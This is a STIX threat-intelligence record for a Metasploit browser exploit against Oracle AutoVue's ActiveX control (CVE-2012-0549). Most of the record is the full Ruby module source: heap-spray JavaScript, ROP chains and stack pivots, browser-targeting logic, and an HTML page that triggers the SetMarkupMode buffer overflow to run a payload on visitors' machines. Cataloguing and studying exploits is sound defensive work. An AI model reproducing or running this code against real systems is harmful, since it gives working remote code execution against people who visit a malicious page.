{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--28df4a46-e0b2-4dcb-a06b-4de1dae6d075",
    "created": "2024-08-14T16:43:16.13682Z",
    "modified": "2024-08-14T16:43:16.136825Z",
    "name": "Oracle AutoVue ActiveX Control SetMarkupMode Buffer Overflow",
    "description": " This module exploits a vulnerability found in the AutoVue.ocx ActiveX control. The vulnerability, due to the insecure usage of an strcpy like function in the SetMarkupMode method, when handling a specially crafted sMarkup argument, allows to trigger a stack based buffer overflow which leads to code execution under the context of the user visiting a malicious web page.  The module has been successfully tested against Oracle AutoVue Desktop Version 20.0.0 (AutoVue.ocx 20.0.0.7330) on IE 6, 7, 8 and 9 (Java 6 needed to DEP and ASLR bypass). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/oracle_autovue_setmarkupmode.rb",
            "external_id": "oracle_autovue_setmarkupmode.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0549"
        },
        {
            "source_name": "reference",
            "url": "http://dvlabs.tippingpoint.com/advisory/TPTI-12-05"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technetwork/topics/security/cpuapr2012-366314.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/08/15/the-stack-cookies-bypass-on-cve-2012-0549"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Remote::Seh\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"9.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :classid    => \"{B6FCC215-D303-11D1-BC6C-0000C078797F}\",\n  #  :method     => \"SetMarkupMode\",\n  #  :rank       => NormalRanking\n  #})\n\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle AutoVue ActiveX Control SetMarkupMode Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability found in the AutoVue.ocx ActiveX control.\n        The vulnerability, due to the insecure usage of an strcpy like function in the\n        SetMarkupMode method, when handling a specially crafted sMarkup argument, allows\n        to trigger a stack based buffer overflow which leads to code execution under the\n        context of the user visiting a malicious web page.\n\n        The module has been successfully tested against Oracle AutoVue Desktop Version\n        20.0.0 (AutoVue.ocx 20.0.0.7330) on IE 6, 7, 8 and 9 (Java 6 needed to DEP and\n        ASLR bypass).\n      },\n      'Author'         =>\n        [\n          'Brian Gorenc', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-0549' ],\n          [ 'BID', '53077' ],\n          [ 'OSVDB', '81439' ],\n          [ 'URL', 'http://dvlabs.tippingpoint.com/advisory/TPTI-12-05' ],\n          [ 'URL', 'http://www.oracle.com/technetwork/topics/security/cpuapr2012-366314.html' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2012/08/15/the-stack-cookies-bypass-on-cve-2012-0549' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space' => 948,\n          'DisableNops' => true,\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          # AutoVue.ocx 20.0.0.7330\n          [ 'Automatic', {} ],\n          [\n            'IE 6 on Windows XP SP3',\n            {\n              'SprayBlocks' => 0x185,\n              'SprayCounter' => '0x5f2', # 0x0c0c0c08\n              'SprayOffset' => '0x600', # 0x0c0c0c24\n              'Offset' => 1052,\n              'Ret' => 0x0c0c0c0c,\n              'Rop' => nil,\n              'RandomHeap' => false\n            }\n          ],\n          [\n            'IE 7 on Windows XP SP3 / Windows Vista SP2',\n            {\n              'SprayBlocks' => 0x185,\n              'SprayCounter' => '0x5f2', # 0x0c0c0c08\n              'SprayOffset' => '0x600', # 0x0c0c0c24\n              'Offset' => 1052,\n              'Ret' => 0x0c0c0c0c,\n              'Rop' => nil,\n              'RandomHeap' => false\n            }\n          ],\n          [\n            'IE 8 with Java 6 on Windows XP SP3/7 SP1/Vista SP2',\n            {\n              'SprayBlocks' => 0x185,\n              'SprayCounter' => '0x5f2', # 0x0c0c0c08\n              'SprayStackPivot' => '0x5f6', # 0x0c0c0c10\n              'SprayOffset' => '0x5fc', # 0x0c0c0c1c\n              'Offset' => 1052,\n              'Ret' => 0x0c0c0c0c,\n              'Rop' => :jre,\n              'RandomHeap' => false,\n            }\n          ],\n          [\n            'IE 9 with Java 6 on Windows 7 SP1',\n            {\n              'SprayBlocks' => 0x1000,\n              'SprayNops' => '0x5f6', # 0x0c0c0bfc\n              'SprayCounter' => '0x5fc', # 0x0c0c0c08\n              'SprayStackPivot' => '0x600', # 0x0c0c0c10\n              'SprayOffset' => '0x606', # 0x0c0c0c1c\n              'Offset' => 1052,\n              'Ret' => 0x0c0c0c0c,\n              'Rop' => :jre,\n              'RandomHeap' => true,\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-04-18',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ], self.class\n    )\n\n  end\n\n  def get_easy_spray(t, js_code, js_nops, js_counter)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    spray = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n    var counter = unescape(\"#{js_counter}\");\n\n    while (nops.length < 0x80000) nops += nops;\n\n    var offset = nops.substring(0, #{t['SprayCounter']});\n    var offset_2 = nops.substring(0, #{t['SprayOffset']} - offset.length - counter.length);\n    var block_used = code.length + offset_2.length + counter.length + offset.length;\n    var shellcode = offset + counter + offset_2  + code + nops.substring(0, 0x800 - block_used);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n    heap_obj.gc();\n    for (var z=1; z < #{t['SprayBlocks']}; z++) {\n      heap_obj.alloc(block);\n    }\n\n    JS\n\n    return spray\n\n  end\n\n  def get_aligned_spray(t, js_code, js_nops, js_counter, js_stack_pivot)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    spray = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n    var counter = unescape(\"#{js_counter}\");\n    var stack_pivot = unescape(\"#{js_stack_pivot}\")\n\n    while (nops.length < 0x80000) nops += nops;\n\n    var offset = nops.substring(0, #{t['SprayCounter']});\n    var offset_2 = nops.substring(0, #{t['SprayStackPivot']} - offset.length - counter.length);\n    var offset_3 = nops.substring(0, #{t['SprayOffset']} - offset.length - counter.length - offset_2.length - stack_pivot.length);\n    var block_used = code.length + offset_3.length + stack_pivot.length + offset_2.length + counter.length + offset.length;\n    var shellcode = offset + counter + offset_2  + stack_pivot + offset_3 + code + nops.substring(0, 0x800 - block_used);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n    heap_obj.gc();\n    for (var z=1; z < #{t['SprayBlocks']}; z++) {\n      heap_obj.alloc(block);\n    }\n\n    JS\n\n    return spray\n\n  end\n\n  # Spray published by corelanc0d3r\n  # Exploit writing tutorial part 11 : Heap Spraying Demystified\n  # See https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/\n  def get_random_spray(t, js_code, js_nops, js_90_nops, js_counter, js_stack_pivot)\n    randnop = rand_text_alpha(rand(100) + 1)\n    randnop2 = rand_text_alpha(rand(100) + 1)\n\n    spray = <<-JS\n\n    function randomblock(blocksize)\n    {\n      var theblock = \"\";\n      for (var i = 0; i < blocksize; i++)\n      {\n        theblock += Math.floor(Math.random()*90)+10;\n      }\n      return theblock;\n    }\n\n    function tounescape(block)\n    {\n      var blocklen = block.length;\n      var unescapestr = \"\";\n      for (var i = 0; i < blocklen-1; i=i+4)\n      {\n        unescapestr += \"%u\" + block.substring(i,i+4);\n      }\n      return unescapestr;\n    }\n\n    var heap_obj = new heapLib.ie(0x10000);\n\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n    var #{randnop2} = \"#{js_90_nops}\";\n    var nops_90 = unescape(#{randnop2});\n    var counter = unescape(\"#{js_counter}\");\n    var stack_pivot = unescape(\"#{js_stack_pivot}\")\n\n    while (nops_90.length < 0x80000) nops_90 += nops_90;\n\n    for (var i=0; i <  #{t['SprayBlocks']}; i++) {\n      var padding = unescape(tounescape(randomblock(0x1000)));\n      while (padding.length < 0x1000) padding+= padding;\n\n\n      var offset = padding.substring(0, #{t['SprayNops']});\n      var offset_2 = padding.substring(0, #{t['SprayCounter']} - offset.length - nops.length);\n      var offset_4 = padding.substring(0, #{t['SprayOffset']} - offset.length -  nops.length - offset_2.length - counter.length - nops.length - stack_pivot.length);\n      var block_used = code.length + offset_4.length + stack_pivot.length + nops.length + counter.length + offset_2.length + nops.length + offset.length;\n      var single_sprayblock = offset + nops + offset_2 + counter + nops  + stack_pivot + offset_4 + code + padding.substring(0, 0x800 - block_used);\n\n      while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;\n      sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);\n      heap_obj.alloc(sprayblock);\n    }\n\n    JS\n\n    return spray\n  end\n\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\").first\n  end\n\n  def nop\n    return make_nops(4).unpack(\"V\").first\n  end\n\n  # stackpivot from msvcr71.dll\n  def get_stack_pivot_stage_1\n    rop = [ 0x7c341ae4 ].pack(\"V*\") # ADD ESP,48 # RETN\n    return rop\n  end\n\n  # stackpivot from msvcr71.dll\n  def get_stack_pivot_stage_2\n    rop = [\n      0x7c3522ca,  # ADD EAX,20 # RETN\n      0x7c348b05,  # XCHG EAX,ESP # RETN\n    ].pack(\"V*\")\n    rop = rop.gsub(/\"/, \"\\\\\\\"\")\n    return rop\n  end\n\n  # ROP chain (msvcr71.dll) generated by mona.py - See corelan.be\n  def get_rop_chain\n    rop = [\n      0x7c37653d,  # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN\n      0x00001000,  # (dwSize)\n      0x7c347f98,  # RETN (ROP NOP)\n      0x7c3415a2,  # JMP [EAX]\n      0xffffffff,\n      0x7c376402,  # skip 4 bytes\n      0x7c345255,  # INC EBX # FPATAN # RETN\n      0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN\n      0x7c344f87,  # POP EDX # RETN\n      0x00000040,  # flNewProtect\n      0x7c34d201,  # POP ECX # RETN\n      0x7c38b001,  # &Writable location\n      0x7c347f97,  # POP EAX # RETN\n      0x7c37a151,  # ptr to &VirtualProtect() - 0x0EF\n      0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN\n      0x7c345c30,  # ptr to 'push esp #  ret '\n    ].pack(\"V*\")\n\n    return rop\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1]  #IE 6 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[2]  #IE 7 on Windows XP SP3\n    elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7/\n      return targets[2]  #IE 7 on Windows Vista SP2\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8/\n      return targets[3]  #IE 8 on Windows XP SP3\n    elsif agent =~ /NT 6\\.[01]/ and agent =~ /MSIE 8/\n      return targets[3]  #IE 8 on Windows 7 SP1/Vista SP2\n    elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 9/\n      return targets[4]  #IE 9 on Windows 7 SP1\n    else\n      return nil\n    end\n  end\n\n  def on_request_uri(cli, request)\n\n    agent = request.headers['User-Agent']\n    print_status(\"User-agent: #{agent}\")\n\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have a setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    p = payload.encoded\n\n    if my_target['Rop'].nil?\n      js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))\n    else\n      js_stack_pivot = Rex::Text.to_unescape(get_stack_pivot_stage_1, Rex::Arch.endian(my_target.arch))\n      js_code = Rex::Text.to_unescape(get_rop_chain + p, Rex::Arch.endian(my_target.arch))\n    end\n\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(my_target.arch))\n    js_90_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))\n    js_counter = Rex::Text.to_unescape(\"\\x01\\x00\\x00\\x00\", Rex::Arch.endian(my_target.arch))\n\n    js = \"\"\n\n    if my_target['RandomHeap']\n      js = get_random_spray(my_target, js_code, js_nops, js_90_nops, js_counter, js_stack_pivot)\n    elsif my_target['Rop']\n      js = get_aligned_spray(my_target, js_code, js_nops, js_counter, js_stack_pivot)\n    else\n      js = get_easy_spray(my_target, js_code, js_nops, js_counter)\n    end\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    if my_target['Rop'].nil?\n      sploit = rand_text_alpha(my_target['Offset'])\n    else\n      sploit = rand_text_alpha(8)\n      sploit << get_stack_pivot_stage_2\n      # +1 because of the escape character in get_stack_pivot_stage_2\n      sploit << rand_text_alpha(my_target['Offset'] - sploit.length + 1)\n    end\n    sploit << [my_target.ret].pack(\"V\")\n\n    html = <<-MYHTML\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <object classid='clsid:B6FCC215-D303-11D1-BC6C-0000C078797F' id='obj' />\n    </object>\n    <script>\n      setTimeout(function(){ obj.SetMarkupMode(\"#{sploit}\"); }, 100);\n    </script>\n    </body>\n    </html>\n    MYHTML\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending html\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-04-18",
    "x_mitre_platforms": [
        "win'"
    ]
}